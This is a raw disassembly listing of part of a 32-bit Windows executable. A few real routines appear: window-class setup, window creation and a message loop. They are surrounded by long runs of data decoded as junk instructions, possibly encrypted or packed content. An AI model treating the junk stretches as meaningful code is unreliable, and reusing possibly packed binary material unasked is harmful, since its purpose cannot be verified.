  41ae46:	bound  eax,QWORD PTR [eax+0x34]
  41ae49:	jl     0x41aeb1
  41ae4b:	inc    edx
  41ae4c:	pop    edi
  41ae4d:	xchg   esi,eax
  41ae4e:	cmp    BYTE PTR [esi+0x73],dl
  41ae51:	xor    DWORD PTR ds:0xb063b85b,0xffffff94
  41ae58:	pop    ds
  41ae59:	mov    eax,ds:0x216120d8
  41ae5e:	fs xchg bh,ah
  41ae61:	push   dx
  41ae63:	or     eax,0xc5f96218
  41ae68:	xchg   edi,eax
  41ae69:	mov    ds:0x9068cba5,eax
  41ae6e:	in     al,dx
  41ae6f:	mov    dl,0x51
  41ae71:	jg     0x41ae1f
  41ae73:	adc    dl,cl
  41ae75:	arpl   WORD PTR ds:0x540627f,ax
  41ae7b:	inc    ecx
  41ae7c:	add    BYTE PTR [ebx+0x40],al
  41ae7f:	inc    eax
  41ae80:	inc    ecx
  41ae81:	inc    eax
  41ae82:	inc    eax
  41ae83:	bound  eax,QWORD PTR ds:0x5624300
  41ae89:	add    BYTE PTR [eax+0x40],al
  41ae8c:	add    BYTE PTR [ecx+0x43],al
  41ae8f:	add    BYTE PTR [eax+0x41],al
  41ae92:	add    eax,0x40436200
  41ae97:	inc    eax
  41ae98:	add    eax,0x3521e162
  41ae9d:	sub    BYTE PTR [ebx+0x51c6c1ac],0x1c
  41aea4:	fadd   DWORD PTR [ecx-0x1e]
  41aea7:	arpl   di,ax
  41aea9:	add    edi,edi
  41aeab:	and    edx,DWORD PTR [edx+0x1a]
  41aeae:	stos   DWORD PTR es:[edi],eax
  41aeaf:	and    DWORD PTR [ebp-0x43],esp
  41aeb2:	push   ecx
  41aeb3:	dec    esi
  41aeb4:	aad    0x2c
  41aeb6:	inc    ecx
  41aeb7:	push   0xffffffea
  41aeb9:	and    al,0xff
  41aebb:	and    ecx,esi
  41aebd:	pop    ebx
  41aebe:	or     DWORD PTR [ebp+edx*1+0x540415e],ebp
  41aec5:	inc    eax
  41aec6:	inc    ebx
  41aec7:	bound  eax,QWORD PTR [ecx-0x7c]
  41aeca:	add    BYTE PTR ds:0x404043,ah
  41aed0:	add    BYTE PTR ds:0x626210,al
  41aed6:	add    eax,0x43404140
  41aedb:	inc    eax
  41aedc:	inc    ecx
  41aedd:	add    eax,0x10664062
  41aee2:	inc    ebx
  41aee3:	bound  edx,QWORD PTR [ecx+0x49]
  41aee6:	xor    eax,0x34629020
  41aeeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aeec:	jmp    DWORD PTR [edx]
  41aeee:	adc    BYTE PTR gs:[ebp+0x25],0x2
  41aef3:	mov    ebx,0xd05ff5f
  41aef8:	rol    esp,cl
  41aefa:	fs cwde 
  41aefc:	mov    al,ds:0x8cc92c22
  41af01:	push   esp
  41af02:	cli    
  41af03:	sub    DWORD PTR [esi],edx
  41af05:	inc    ebp
  41af06:	add    eax,0x4041cc
  41af0b:	add    BYTE PTR [eax],al
  41af0d:	inc    eax
  41af0e:	inc    eax
  41af0f:	inc    ebx
  41af10:	bound  eax,QWORD PTR [eax]
  41af12:	inc    eax
  41af13:	inc    eax
  41af14:	add    eax,0x62434162
  41af19:	inc    eax
  41af1a:	js     0x41af2c
  41af1c:	inc    ecx
  41af1d:	add    eax,0x5404325
  41af22:	bound  eax,QWORD PTR [eax+0x40]
  41af25:	inc    ecx
  41af26:	inc    ebx
  41af27:	push   edx
  41af28:	mov    WORD PTR [edx+0x40],ds
  41af2b:	call   0xe6e3aed0
  41af30:	or     eax,0x8b0db5b7
  41af35:	cs dec edx
  41af37:	pushf  
  41af38:	retf   
  41af39:	mov    al,ds:0x410e4152
  41af3e:	and    BYTE PTR [esp+ecx*4+0x52],al
  41af42:	mov    al,0xc3
  41af44:	into   
  41af45:	mov    al,ds:0x44442c23
  41af4a:	adc    eax,0x56bd1837
  41af4f:	push   edx
  41af50:	and    eax,0x436241
  41af55:	adc    BYTE PTR [eax+0x0],al
  41af58:	add    eax,0xcc410040
  41af5d:	int3   
  41af5e:	int3   
  41af5f:	int3   
  41af60:	push   ebp
  41af61:	mov    ebp,esp
  41af63:	sub    esp,0x30
  41af66:	mov    DWORD PTR [ebp-0x30],0x30
  41af6d:	mov    DWORD PTR [ebp-0x18],0x0
  41af74:	mov    DWORD PTR [ebp-0x4],0x0
  41af7b:	mov    DWORD PTR [ebp-0x10],0x6
  41af82:	mov    DWORD PTR [ebp-0xc],0x64
  41af89:	mov    DWORD PTR [ebp-0x8],0x4307f4
  41af90:	mov    DWORD PTR [ebp-0x2c],0x3
  41af97:	push   0x7f00
  41af9c:	push   0x0
  41af9e:	call   DWORD PTR ds:0x429118
  41afa4:	mov    DWORD PTR [ebp-0x14],eax
  41afa7:	mov    DWORD PTR [ebp-0x28],0x41d9b0
  41afae:	mov    DWORD PTR [ebp-0x24],0x0
  41afb5:	mov    DWORD PTR [ebp-0x20],0x0
  41afbc:	mov    eax,DWORD PTR [ebp+0x8]
  41afbf:	mov    DWORD PTR [ebp-0x1c],eax
  41afc2:	mov    DWORD PTR [ebp-0x4],0x0
  41afc9:	lea    ecx,[ebp-0x30]
  41afcc:	push   ecx
  41afcd:	call   DWORD PTR ds:0x42911c
  41afd3:	mov    esp,ebp
  41afd5:	pop    ebp
  41afd6:	ret    
  41afd7:	int3   
  41afd8:	int3   
  41afd9:	int3   
  41afda:	int3   
  41afdb:	int3   
  41afdc:	int3   
  41afdd:	int3   
  41afde:	int3   
  41afdf:	int3   
  41afe0:	mov    eax,DWORD PTR [edi]
  41afe2:	mov    ecx,DWORD PTR [ebp-0x4]
  41afe5:	add    ecx,eax
  41afe7:	push   DWORD PTR [ebp+0xc]
  41afea:	push   ecx
  41afeb:	call   0x401010
  41aff0:	ret    
  41aff1:	int3   
  41aff2:	int3   
  41aff3:	int3   
  41aff4:	int3   
  41aff5:	int3   
  41aff6:	int3   
  41aff7:	int3   
  41aff8:	int3   
  41aff9:	int3   
  41affa:	int3   
  41affb:	int3   
  41affc:	int3   
  41affd:	int3   
  41affe:	int3   
  41afff:	int3   
  41b000:	push   ebx
  41b001:	mov    ebx,esi
  41b003:	mov    eax,DWORD PTR [ebx]
  41b005:	jmp    0x410040
  41b00a:	pop    ebx
  41b00b:	call   0x40b820
  41b010:	ret    
  41b011:	int3   
  41b012:	int3   
  41b013:	int3   
  41b014:	int3   
  41b015:	int3   
  41b016:	int3   
  41b017:	int3   
  41b018:	int3   
  41b019:	int3   
  41b01a:	int3   
  41b01b:	int3   
  41b01c:	int3   
  41b01d:	int3   
  41b01e:	int3   
  41b01f:	int3   
  41b020:	push   ebp
  41b021:	mov    ebp,esp
  41b023:	push   ecx
  41b024:	mov    eax,DWORD PTR [ebp+0x8]
  41b027:	mov    ds:0x431da4,eax
  41b02c:	mov    DWORD PTR ds:0x431d9c,0x0
  41b036:	mov    ecx,DWORD PTR [ebp+0x8]
  41b039:	mov    DWORD PTR ds:0x42fa0b,ecx
  41b03f:	push   0x0
  41b041:	mov    edx,DWORD PTR [ebp+0x8]
  41b044:	push   edx
  41b045:	push   0x0
  41b047:	push   0x0
  41b049:	push   0x328
  41b04e:	push   0x4b6
  41b053:	push   0x0
  41b055:	push   0x0
  41b057:	push   0xcf0000
  41b05c:	push   0x4307e0
  41b061:	push   0x4307f4
  41b066:	push   0x0
  41b068:	call   DWORD PTR ds:0x429114
  41b06e:	mov    DWORD PTR [ebp-0x4],eax
  41b071:	cmp    DWORD PTR [ebp-0x4],0x0
  41b075:	jne    0x41b07b
  41b077:	xor    eax,eax
  41b079:	jmp    0x41b080
  41b07b:	mov    eax,0x1
  41b080:	mov    esp,ebp
  41b082:	pop    ebp
  41b083:	ret    
  41b084:	int3   
  41b085:	int3   
  41b086:	int3   
  41b087:	int3   
  41b088:	int3   
  41b089:	int3   
  41b08a:	int3   
  41b08b:	int3   
  41b08c:	int3   
  41b08d:	int3   
  41b08e:	int3   
  41b08f:	int3   
  41b090:	add    eax,0x60
  41b093:	mov    esi,DWORD PTR [eax]
  41b095:	mov    eax,DWORD PTR [ebp-0x4]
  41b098:	add    eax,esi
  41b09a:	add    eax,0x20
  41b09d:	mov    esi,eax
  41b09f:	mov    edi,DWORD PTR [esi]
  41b0a1:	sub    esi,0xc
  41b0a4:	mov    eax,DWORD PTR [esi]
  41b0a6:	add    edi,DWORD PTR [ebp-0x4]
  41b0a9:	mov    DWORD PTR [ebp-0xc],eax
  41b0ac:	sub    esi,0x14
  41b0af:	xor    edx,edx
  41b0b1:	mov    ebx,DWORD PTR [ebp+0xc]
  41b0b4:	ret    
  41b0b5:	int3   
  41b0b6:	int3   
  41b0b7:	int3   
  41b0b8:	int3   
  41b0b9:	int3   
  41b0ba:	int3   
  41b0bb:	int3   
  41b0bc:	int3   
  41b0bd:	int3   
  41b0be:	int3   
  41b0bf:	int3   
  41b0c0:	push   ebp
  41b0c1:	mov    ebp,esp
  41b0c3:	sub    esp,0x34
  41b0c6:	push   0x65
  41b0c8:	mov    eax,DWORD PTR [ebp+0x8]
  41b0cb:	push   eax
  41b0cc:	call   DWORD PTR ds:0x429120
  41b0d2:	mov    DWORD PTR [ebp-0x10],eax
  41b0d5:	call   DWORD PTR ds:0x429000
  41b0db:	push   0x65
  41b0dd:	mov    ecx,DWORD PTR [ebp+0x8]
  41b0e0:	push   ecx
  41b0e1:	call   DWORD PTR ds:0x429124
  41b0e7:	call   DWORD PTR ds:0x429030
  41b0ed:	mov    ds:0x431dac,eax
  41b0f2:	mov    edx,DWORD PTR [ebp+0x8]
  41b0f5:	push   edx
  41b0f6:	call   0x41af60
  41b0fb:	add    esp,0x4
  41b0fe:	push   0x0
  41b100:	mov    eax,DWORD PTR [ebp+0x8]
  41b103:	push   eax
  41b104:	call   0x41b020
  41b109:	add    esp,0x8
  41b10c:	test   eax,eax
  41b10e:	setne  cl
  41b111:	mov    BYTE PTR [ebp-0x2d],cl
  41b114:	push   0x0
  41b116:	push   0x0
  41b118:	push   0x0
  41b11a:	lea    edx,[ebp-0x2c]
  41b11d:	push   edx
  41b11e:	call   DWORD PTR ds:0x429128
  41b124:	test   eax,eax
  41b126:	je     0x41b154
  41b128:	lea    eax,[ebp-0x2c]
  41b12b:	push   eax
  41b12c:	mov    ecx,DWORD PTR [ebp-0x10]
  41b12f:	push   ecx
  41b130:	mov    edx,DWORD PTR [ebp-0x2c]
  41b133:	push   edx
  41b134:	call   DWORD PTR ds:0x42912c
  41b13a:	test   eax,eax
  41b13c:	jne    0x41b152
  41b13e:	lea    eax,[ebp-0x2c]
  41b141:	push   eax
  41b142:	call   DWORD PTR ds:0x429130
  41b148:	lea    ecx,[ebp-0x2c]
  41b14b:	push   ecx
  41b14c:	call   DWORD PTR ds:0x429134
  41b152:	jmp    0x41b114
  41b154:	movzx  edx,BYTE PTR [ebp-0x2d]
  41b158:	test   edx,edx
  41b15a:	jne    0x41b16d
  41b15c:	push   DWORD PTR ds:0x431d9c
  41b162:	inc    ecx
  41b163:	pop    eax
  41b164:	call   0x40e590
  41b169:	xor    eax,eax
  41b16b:	jmp    0x41b170
  41b16d:	mov    eax,DWORD PTR [ebp-0x24]
  41b170:	mov    esp,ebp
  41b172:	pop    ebp
  41b173:	ret    0x10
  41b176:	int3   
  41b177:	int3   
  41b178:	int3   
  41b179:	int3   
  41b17a:	int3   
  41b17b:	int3   
  41b17c:	int3   
  41b17d:	int3   
  41b17e:	int3   
  41b17f:	int3   
  41b180:	or     al,0x42
  41b182:	mov    dh,0xca
  41b184:	push   eax
  41b185:	push   esi
  41b186:	add    eax,0xe08d4590
  41b18b:	loopne 0x41b191
  41b18d:	shl    BYTE PTR [ecx+0x26],0x2d
  41b191:	lock push edx
  41b193:	(bad)  
  41b194:	int    0xe5
  41b196:	ins    BYTE PTR es:[edi],dx
  41b197:	mov    esi,0x7698544a
  41b19c:	push   ecx
  41b19d:	sbb    eax,0xd4c0d123
  41b1a2:	and    al,0x84
  41b1a4:	retf   
  41b1a5:	pop    edx
  41b1a6:	jl     0x41b13e
  41b1a8:	inc    edi
  41b1a9:	and    eax,0xf34862c9
  41b1ae:	mov    ds:0x40417123,eax
  41b1b3:	add    eax,0x43436240
  41b1b8:	add    eax,0x62004040
  41b1bd:	inc    eax
  41b1be:	add    BYTE PTR [ecx+0x40],al
  41b1c1:	inc    ebx
  41b1c2:	test   BYTE PTR ds:0x58054041,ah
  41b1c8:	inc    eax
  41b1c9:	inc    eax
  41b1ca:	bound  eax,QWORD PTR [eax+0x66]
  41b1cd:	inc    ecx
  41b1ce:	inc    eax
  41b1cf:	add    eax,0x7a7c2c00
  41b1d4:	or     eax,0xa83cf89b
  41b1d9:	test   al,0x52
  41b1db:	adc    al,0xcb
  41b1dd:	adc    eax,0x545a9163
  41b1e2:	jle    0x41b249
  41b1e4:	inc    edx
  41b1e5:	inc    eax
  41b1e6:	in     al,dx
  41b1e7:	push   ebx
  41b1e8:	aaa    
  41b1e9:	sub    bh,BYTE PTR [ebx+esi*2-0x35]
  41b1ed:	frstor [ebx-0x2f]
  41b1f0:	inc    ebx
  41b1f1:	inc    eax
  41b1f2:	push   0x0
  41b1f4:	add    BYTE PTR [ebx+0x40],al
  41b1f7:	bound  eax,QWORD PTR ds:0x25404110
  41b1fd:	add    ah,cl
  41b1ff:	inc    ebx
  41b200:	add    eax,0x40402562
  41b205:	add    BYTE PTR [eax+0x40],al
  41b208:	inc    ecx
  41b209:	inc    ecx
  41b20a:	add    eax,0x78434025
  41b20f:	bound  eax,QWORD PTR [eax-0x7c]
  41b212:	inc    eax
  41b213:	inc    ecx
  41b214:	in     al,0x4c
  41b216:	fwait
  41b217:	retf   
  41b218:	(bad)  
  41b219:	fadd   QWORD PTR [eax+0x9]
  41b21c:	adc    BYTE PTR ds:0xbe5167dd,0x66
  41b223:	pop    esp
  41b224:	add    eax,0x5a5fcccb
  41b229:	fld    QWORD PTR [ebx+0x63]
  41b22c:	xchg   DWORD PTR [edi+0xe],ecx
  41b22f:	stos   DWORD PTR es:[edi],eax
  41b230:	push   edx
  41b231:	test   al,0xa8
  41b233:	mov    ebp,0x41e7c86d
  41b238:	inc    eax
  41b239:	inc    eax
  41b23a:	inc    ebx
  41b23b:	int3   
  41b23c:	add    BYTE PTR ds:0x56240,al
  41b242:	inc    ebx
  41b243:	inc    eax
  41b244:	inc    eax
  41b245:	add    BYTE PTR [ecx+0x62],al
  41b248:	bound  eax,QWORD PTR [eax]
  41b24a:	int3   
  41b24b:	inc    eax
  41b24c:	inc    ebx
  41b24d:	add    eax,0x43624041
  41b252:	adc    BYTE PTR [ecx+0x5],al
  41b255:	inc    eax
  41b256:	aas    
  41b257:	adc    BYTE PTR es:[eax+0x38],al
  41b25b:	lahf   
  41b25c:	push   eax
  41b25d:	xchg   DWORD PTR cs:[edi],eax
  41b260:	pop    esp
  41b261:	inc    eax
  41b262:	arpl   WORD PTR [ebp+0x62],bp
  41b265:	xor    BYTE PTR [eax+esi*1],ah
  41b268:	add    BYTE PTR [ecx+ecx*2+0x34],0x10
  41b26d:	inc    ebx
  41b26e:	and    eax,0xfc51c3fd
  41b273:	bound  edx,QWORD PTR [eax-0x45]
  41b276:	pop    esi
  41b277:	bound  eax,QWORD PTR [ebx+0x40]
  41b27a:	adc    BYTE PTR ds:0x4158cc40,al
  41b280:	inc    ebx
  41b281:	bound  eax,QWORD PTR [ecx+0x40]
  41b284:	add    eax,0x4140
  41b289:	and    eax,0x40400062
  41b28e:	add    eax,0x84404340
  41b293:	int3   
  41b294:	js     0x41b296
  41b296:	inc    ecx
  41b297:	adc    BYTE PTR [edx+0xf],ah
  41b29a:	pusha  
  41b29b:	mov    esp,0x5c5404b
  41b2a0:	out    0x63,eax
  41b2a2:	add    al,BYTE PTR [ebp-0x3f]
  41b2a5:	test   al,0x70
  41b2a7:	imul   eax,DWORD PTR [ebp+0x44],0xfffffff1
  41b2ab:	lock aam 0x72
  41b2ae:	mov    cl,0xb3
  41b2b0:	push   edx
  41b2b1:	gs inc eax
  41b2b3:	inc    esp
  41b2b4:	sti    
  41b2b5:	bound  esp,QWORD PTR ss:[edx-0x36]
  41b2b9:	aaa    
  41b2ba:	push   ecx
  41b2bb:	bound  edi,QWORD PTR [eax]
  41b2bd:	dec    edi
  41b2be:	inc    esp
  41b2bf:	push   eax
  41b2c0:	push   esi
  41b2c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2c2:	push   0x7
  41b2c4:	pusha  
  41b2c5:	xor    eax,0xcc2e507c
  41b2ca:	pop    ds
  41b2cb:	fadd   QWORD PTR [eax]
  41b2cd:	inc    eax
  41b2ce:	inc    ecx
  41b2cf:	inc    eax
  41b2d0:	inc    ebx
  41b2d1:	bound  ax,DWORD PTR ds:0x40434100
  41b2d8:	add    eax,0x40054062
  41b2dd:	bound  eax,QWORD PTR [ecx+0x40]
  41b2e0:	inc    ebx
  41b2e1:	inc    eax
  41b2e2:	add    eax,0x25405841
  41b2e7:	bound  eax,QWORD PTR [eax+0x43]
  41b2ea:	inc    eax
  41b2eb:	adc    al,cl
  41b2ed:	sbb    cl,cl
  41b2ef:	add    eax,0x446d6120
  41b2f4:	push   esp
  41b2f5:	mov    edx,0x5e80875d
  41b2fa:	push   edi
  41b2fb:	sub    ah,BYTE PTR [edx]
  41b2fd:	bound  edx,QWORD PTR ds:0x48619347
  41b303:	push   cs
  41b304:	or     BYTE PTR [eax+0x1041353d],dh
  41b30a:	popf   
  41b30b:	xor    ch,BYTE PTR [eax+0x1343cb6c]
  41b311:	arpl   WORD PTR [eax-0x3c],cx
  41b314:	adc    BYTE PTR [edx-0x59],ah
  41b317:	addr16 and al,0x40
  41b31a:	inc    ecx
  41b31b:	inc    ebx
  41b31c:	inc    eax
  41b31d:	add    eax,0x43406262
  41b322:	inc    ecx
  41b323:	adc    BYTE PTR [eax],al
  41b325:	inc    eax
  41b326:	add    eax,0x43000562
  41b32b:	add    BYTE PTR [ecx+0x40],al
  41b32e:	inc    eax
  41b32f:	add    eax,0x400062
  41b334:	inc    ebx
  41b335:	inc    eax
  41b336:	js     0x41b379
  41b338:	inc    ecx
  41b339:	bound  eax,QWORD PTR [eax-0x1]
  41b33c:	lahf   
  41b33d:	dec    edi
  41b33e:	clc    
  41b33f:	test   ebp,ebp
  41b341:	xor    bh,dh
  41b343:	dec    eax
  41b344:	dec    eax
  41b345:	add    BYTE PTR ds:0x2c4070c0,0xe1
  41b34c:	lahf   
  41b34d:	(bad)
  41b350:	and    BYTE PTR [esi+eiz*2+0x43413f6b],dh
  41b357:	adc    eax,0xe73e0563
  41b35c:	dec    eax
  41b35d:	into   
  41b35e:	(bad)  
  41b35f:	in     al,0x62
  41b361:	inc    eax
  41b362:	add    eax,0x40430041
  41b367:	inc    eax
  41b368:	inc    ecx
  41b369:	inc    eax
  41b36a:	inc    eax
  41b36b:	bound  eax,QWORD PTR ds:0x5624300
  41b371:	add    BYTE PTR [eax+0x40],al
  41b374:	add    BYTE PTR [ecx+0x43],al
  41b377:	add    BYTE PTR [eax+0x41],al
  41b37a:	add    eax,0x40436200
  41b37f:	inc    eax
  41b380:	add    eax,0xca86c962
  41b385:	inc    edi
  41b386:	lahf   
  41b387:	mov    eax,0x3da86434
  41b38c:	inc    ebx
  41b38d:	es dec eax
  41b38f:	arpl   WORD PTR [ecx+0x6b],ax
  41b392:	or     eax,0x9f3355b3
  41b397:	mov    ebp,0x5cb402a
  41b39c:	call   0x6243:0x40054041
  41b3a3:	inc    ecx
  41b3a4:	test   BYTE PTR [eax],al
  41b3a6:	and    eax,0x404043
  41b3ab:	add    BYTE PTR ds:0x626210,al
  41b3b1:	add    eax,0x43404140
  41b3b6:	inc    eax
  41b3b7:	inc    ecx
  41b3b8:	add    eax,0x10664062
  41b3bd:	inc    ebx
  41b3be:	bound  ebx,QWORD PTR [eax+0x48]
  41b3c1:	dec    ebp
  41b3c2:	mov    al,0x44
  41b3c4:	inc    ecx
  41b3c5:	xchg   BYTE PTR [esi+0x3a89fa3],ch
  41b3cb:	push   eax
  41b3cc:	and    esi,DWORD PTR [ebx]
  41b3ce:	dec    eax
  41b3cf:	popa   
  41b3d0:	push   0x58415b47
  41b3d5:	mov    dl,0xc5
  41b3d7:	and    edi,ebx
  41b3d9:	sub    ah,BYTE PTR [edx-0x4]
  41b3dc:	push   edx
  41b3dd:	add    eax,0x4041cc
  41b3e2:	add    BYTE PTR [eax],al
  41b3e4:	inc    eax
  41b3e5:	inc    eax
  41b3e6:	inc    ebx
  41b3e7:	bound  eax,QWORD PTR [eax]
  41b3e9:	inc    eax
  41b3ea:	inc    eax
  41b3eb:	add    eax,0x62434162
  41b3f0:	inc    eax
  41b3f1:	js     0x41b403
  41b3f3:	inc    ecx
  41b3f4:	add    eax,0x5404325
  41b3f9:	bound  eax,QWORD PTR [eax+0x40]
  41b3fc:	inc    ecx
  41b3fd:	inc    ebx
  41b3fe:	add    eax,0x1168454f
  41b403:	lock inc edi
  41b405:	les    eax,FWORD PTR [esi+0x5cdf2180]
  41b40b:	fsub   DWORD PTR [eax+0x4f]
  41b40e:	gs cs push esp
  41b411:	or     al,BYTE PTR [ecx-0x4ebfeffb]
  41b417:	test   eax,0x87c3f263
  41b41c:	inc    ecx
  41b41d:	mov    eax,ds:0x6eaf2305
  41b422:	inc    esi
  41b423:	es std 
  41b425:	mov    DWORD PTR [esi-0x34b6982e],0x3c647532
  41b42f:	add    BYTE PTR [esi],ah
  41b431:	push   eax
  41b432:	lods   al,BYTE PTR ds:[esi]
  41b433:	and    eax,0x436241
  41b438:	adc    BYTE PTR [eax+0x0],al
  41b43b:	add    eax,0x62410040
  41b440:	inc    eax
  41b441:	add    BYTE PTR [ebx-0x34],al
  41b444:	inc    eax
  41b445:	add    eax,0x78434040
  41b44a:	bound  eax,QWORD PTR [ecx+0x78]
  41b44d:	add    eax,0x62404043
  41b452:	call   0x4f1d43f
  41b457:	adc    edi,DWORD PTR [ebp+0x20410562]
  41b45d:	add    eax,0x602d2fd2
  41b462:	xchg   ebp,edi
  41b464:	fs xchg dl,bl
  41b467:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b468:	inc    ebp
  41b469:	sbb    DWORD PTR [eax],0x4e
  41b46c:	xor    eax,0x40412027
  41b471:	add    eax,0x43436240
  41b476:	add    eax,0x62004040
  41b47b:	inc    eax
  41b47c:	add    BYTE PTR [ecx+0x40],al
  41b47f:	inc    ebx
  41b480:	test   BYTE PTR ds:0x58054041,ah
  41b486:	inc    eax
  41b487:	inc    eax
  41b488:	bound  eax,QWORD PTR [eax+0x66]
  41b48b:	inc    ecx
  41b48c:	inc    eax
  41b48d:	add    eax,0x5df2cb00
  41b492:	lods   al,BYTE PTR ds:[esi]
  41b493:	pusha  
  41b494:	test   al,0x43
  41b496:	dec    esi
  41b497:	loope  0x41b507
  41b499:	push   edx
  41b49a:	ret    
  41b49b:	push   esi
  41b49c:	inc    ebp
  41b49d:	inc    eax
  41b49e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b49f:	pop    ecx
  41b4a0:	inc    esi
  41b4a1:	push   cs
  41b4a2:	inc    ebx
  41b4a3:	jl     0x41b4cf
  41b4a5:	aaa    
  41b4a6:	(bad)  
  41b4a8:	mov    ebx,0x356a4938
  41b4ad:	sub    BYTE PTR [esi+eiz*1],dl
  41b4b0:	add    BYTE PTR [eax],al
  41b4b2:	inc    ebx
  41b4b3:	inc    eax
  41b4b4:	bound  eax,QWORD PTR ds:0x25404110
  41b4ba:	add    ah,cl
  41b4bc:	inc    ebx
  41b4bd:	add    eax,0x40402562
  41b4c2:	add    BYTE PTR [eax+0x40],al
  41b4c5:	inc    ecx
  41b4c6:	inc    ecx
  41b4c7:	add    eax,0x78434025
  41b4cc:	bound  eax,QWORD PTR [eax-0x7c]
  41b4cf:	inc    eax
  41b4d0:	inc    ecx
  41b4d1:	inc    edx
  41b4d2:	in     al,0xfc
  41b4d4:	pop    ebx
  41b4d5:	sbb    BYTE PTR [edx-0x80],cl
  41b4d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4d9:	mov    bl,0xc4
  41b4db:	dec    ecx
  41b4dc:	pusha  
  41b4dd:	fwait
  41b4de:	rcr    BYTE PTR [esi],0x4b
  41b4e1:	inc    ecx
  41b4e2:	dec    edi
  41b4e3:	nop
  41b4e4:	jno    0x41b478
  41b4e6:	or     ch,BYTE PTR [edx+0x299b50e1]
  41b4ec:	push   eax
  41b4ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4ee:	test   al,0x26
  41b4f0:	ds xor ebp,ebx
  41b4f3:	xchg   esp,eax
  41b4f4:	adc    eax,0x25f81246
  41b4f9:	inc    ecx
  41b4fa:	imul   cx,bx,0x4879
  41b4ff:	adc    edi,edi
  41b501:	cmp    eax,DWORD PTR [ecx+0x40]
  41b504:	inc    eax
  41b505:	inc    ebx
  41b506:	int3   
  41b507:	add    BYTE PTR ds:0x56240,al
  41b50d:	inc    ebx
  41b50e:	inc    eax
  41b50f:	inc    eax
  41b510:	add    BYTE PTR [ecx+0x62],al
  41b513:	bound  eax,QWORD PTR [eax]
  41b515:	int3   
  41b516:	inc    eax
  41b517:	inc    ebx
  41b518:	add    eax,0x43624041
  41b51d:	adc    BYTE PTR [ecx+0x5],al
  41b520:	inc    eax
  41b521:	dec    ebx
  41b522:	xchg   edx,eax
  41b523:	ins    BYTE PTR es:[edi],dx
  41b524:	fadd   QWORD PTR [ecx-0x40]
  41b527:	les    ebx,FWORD PTR ds:0x63c7ab24
  41b52d:	test   BYTE PTR [ecx+0x446642ad],ah
  41b533:	stos   DWORD PTR es:[edi],eax
  41b534:	push   es
  41b535:	cmp    al,0x6d
  41b537:	int    0x10
  41b539:	and    ch,BYTE PTR [ebx+0x1542a9b0]
  41b53f:	jecxz  0x41b568
  41b541:	bound  eax,QWORD PTR [ebx+0x40]
  41b544:	adc    BYTE PTR ds:0x4158cc40,al
  41b54a:	inc    ebx
  41b54b:	bound  eax,QWORD PTR [ecx+0x40]
  41b54e:	add    eax,0x4140
  41b553:	and    eax,0x40400062
  41b558:	add    eax,0x84404340
  41b55d:	int3   
  41b55e:	js     0x41b560
  41b560:	inc    ecx
  41b561:	adc    BYTE PTR [edx+0xf],ah
  41b564:	test   al,0x41
  41b566:	add    al,0xc
  41b568:	or     al,0x62
  41b56a:	adc    al,0x41
  41b56c:	je     0x41b549
  41b56e:	mov    gs,WORD PTR [esi+0x71e13ccd]
  41b574:	sub    al,ah
  41b576:	arpl   WORD PTR [ebx-0x48],sp
  41b579:	push   0x47402072
  41b57e:	add    BYTE PTR [eax+0x41],al
  41b581:	inc    eax
  41b582:	inc    ebx
  41b583:	bound  ax,DWORD PTR ds:0x40434100
  41b58a:	add    eax,0x40054062
  41b58f:	bound  eax,QWORD PTR [ecx+0x40]
  41b592:	inc    ebx
  41b593:	inc    eax
  41b594:	add    eax,0x25405841
  41b599:	bound  eax,QWORD PTR [eax+0x43]
  41b59c:	inc    eax
  41b59d:	adc    BYTE PTR [ebx+0x4d],ah
  41b5a0:	add    eax,0x4091e105
  41b5a5:	xor    eax,0xafcb08ac
  41b5aa:	inc    ebx
  41b5ab:	adc    BYTE PTR [ecx+0x41],al
  41b5ae:	pusha  
  41b5af:	push   esp
  41b5b0:	push   ecx
  41b5b1:	push   eax
  41b5b2:	popa   
  41b5b3:	repnz (bad) 
  41b5b5:	ds inc eax
  41b5b7:	inc    ecx
  41b5b8:	inc    ebx
  41b5b9:	inc    eax
  41b5ba:	add    eax,0x43406262
  41b5bf:	inc    ecx
  41b5c0:	adc    BYTE PTR [eax],al
  41b5c2:	inc    eax
  41b5c3:	add    eax,0x43000562
  41b5c8:	add    BYTE PTR [ecx+0x40],al
  41b5cb:	inc    eax
  41b5cc:	add    eax,0x400062
  41b5d1:	inc    ebx
  41b5d2:	inc    eax
  41b5d3:	js     0x41b616
  41b5d5:	inc    ecx
  41b5d6:	bound  eax,QWORD PTR [eax+0x34]
  41b5d9:	ins    DWORD PTR es:[edi],dx
  41b5da:	inc    esp
  41b5db:	outs   dx,BYTE PTR ds:[esi]
  41b5dc:	jb     0x41b608
  41b5de:	inc    esi
  41b5df:	aad    0x80
  41b5e1:	or     BYTE PTR [edx-0x70],ch
  41b5e4:	sub    eax,DWORD PTR [eax+0x3e]
  41b5e7:	inc    esp
  41b5e8:	lds    esp,FWORD PTR [edx+0x60]
  41b5eb:	inc    edx
  41b5ec:	jb     0x41b61d
  41b5ee:	jl     0x41b652
  41b5f0:	inc    eax
  41b5f1:	add    eax,0x40430041
  41b5f6:	inc    eax
  41b5f7:	inc    ecx
  41b5f8:	inc    eax
  41b5f9:	inc    eax
  41b5fa:	bound  eax,QWORD PTR ds:0x5624300
  41b600:	add    BYTE PTR [eax+0x40],al
  41b603:	add    BYTE PTR [ecx+0x43],al
  41b606:	add    BYTE PTR [eax+0x41],al
  41b609:	add    eax,0x40436200
  41b60e:	inc    eax
  41b60f:	add    eax,0x54417b62
  41b614:	bound  esp,QWORD PTR ds:0x486ff83f
  41b61a:	mov    WORD PTR [eax+edi*4+0x7c],ds
  41b61e:	inc    esp
  41b61f:	sbb    eax,DWORD PTR ss:[ecx-0x20]
  41b623:	rol    DWORD PTR ds:0xdcd166c7,0x84
  41b62a:	sbb    BYTE PTR [ecx+ecx*8],ah
  41b62d:	scas   al,BYTE PTR es:[edi]
  41b62e:	mov    edi,0x9ad07a44
  41b633:	pop    esp
  41b634:	dec    edx
  41b635:	dec    edx
  41b636:	xor    BYTE PTR [eax+ecx*8+0x63],dl
  41b63a:	shl    DWORD PTR [ecx],0xeb
  41b63d:	or     cl,BYTE PTR [ebp+0x6e]
